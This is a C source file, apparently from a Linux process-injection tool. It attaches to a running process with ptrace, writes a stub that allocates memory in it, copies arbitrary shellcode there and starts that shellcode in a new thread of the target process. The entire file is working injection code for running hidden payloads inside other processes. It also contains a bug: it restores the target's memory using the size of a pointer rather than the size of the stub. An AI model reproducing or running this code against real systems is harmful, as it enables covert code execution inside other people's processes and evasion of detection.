#include "inject_shellcode_new_thread.h"


void inject_shellcode_new_thread(pid_t target, char* path_to_shellcode){

  dzlog_info("Loading shellcode from %s", path_to_shellcode);
  int size_of_shellcode = 0;
  char* shellcode = read_file(path_to_shellcode, &size_of_shellcode);

  int size_of_malloc_shellcode = 0;
  char* MALLOC_SHELLCODE = read_file("/home/max/code/linux-inject/payloads/sys_clone_payload.bin", &size_of_malloc_shellcode);
  
  struct user_regs_struct oldregs, regs;
  memset(&oldregs, 0, sizeof(struct user_regs_struct));
  memset(&regs, 0, sizeof(struct user_regs_struct));
	
  ptrace_attach(target);

  ptrace_getregs(target, &oldregs);
  memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

  long addr = freespaceaddr(target) + sizeof(long);
  regs.rip = addr + 2;

  ptrace_setregs(target, &regs);

  // back up whatever data used to be at the address we want to modify
  // write shellcode to this address and run process
  char* backup = malloc(size_of_malloc_shellcode);
  ptrace_read(target, addr, backup, size_of_malloc_shellcode);
  ptrace_write(target, addr, MALLOC_SHELLCODE, size_of_malloc_shellcode);	
  
  ptrace_cont(target);

  // at this point, the target should have run malloc(). check its return
  // value to see if it succeeded, and bail out cleanly if it didn't.
  struct user_regs_struct malloc_regs;
  memset(&malloc_regs, 0, sizeof(struct user_regs_struct));
  ptrace_getregs(target, &malloc_regs);
  unsigned long long targetBuf = malloc_regs.rax;
  if(targetBuf == 0)
  {
    dzlog_error("malloc() failed to allocate memory");
    restoreStateAndDetach(target, addr, backup, sizeof(MALLOC_SHELLCODE), oldregs);
    free(backup);
    exit(1);
  }
  dzlog_info("mmap allocated at 0x%llx", malloc_regs.rax);
  ptrace_write(target, targetBuf, shellcode, size_of_shellcode);

  ptrace_cont(target);
  struct user_regs_struct mmap_regs;
  memset(&mmap_regs, 0, sizeof(struct user_regs_struct));
  ptrace_getregs(target, &mmap_regs);
  dzlog_info("Calling mmap: rdi 0x%llx, rsi 0x%llx, rdx 0x%llx, r10 0x%llx, rax 0x%llx", mmap_regs.rdi, mmap_regs.rsi, mmap_regs.rdx, mmap_regs.r10, mmap_regs.rax); 
  
  ptrace_cont(target);
  memset(&mmap_regs, 0, sizeof(struct user_regs_struct));
  ptrace_getregs(target, &mmap_regs);
  unsigned long long mmap_res = mmap_regs.rax;
  dzlog_info("MMAP 0x%llx", mmap_res);

  ptrace_cont(target);
  struct user_regs_struct pthread_regs;
  memset(&pthread_regs, 0, sizeof(struct user_regs_struct));
  ptrace_getregs(target, &pthread_regs);
  pthread_regs.r14 = targetBuf;
  ptrace_setregs(target, &pthread_regs);
  dzlog_info("Calling sys_clone: rdi 0x%llx, rsi 0x%llx, rdx 0x%llx, rax 0x%llx, rip 0x%llx", pthread_regs.rdi, pthread_regs.rsi, pthread_regs.rdx, pthread_regs.rax, pthread_regs.rip); 
  ptrace_cont(target);

  memset(&pthread_regs, 0, sizeof(struct user_regs_struct));
  ptrace_getregs(target, &pthread_regs);
  dzlog_info("sys_clone returns 0x%llx", pthread_regs.rax);
  
  restoreStateAndDetach(target, addr, backup, sizeof(MALLOC_SHELLCODE), oldregs);
  free(backup);
  free(shellcode);

  dzlog_info("Finished injection of shellcode. It runs with its own thread now.");
}
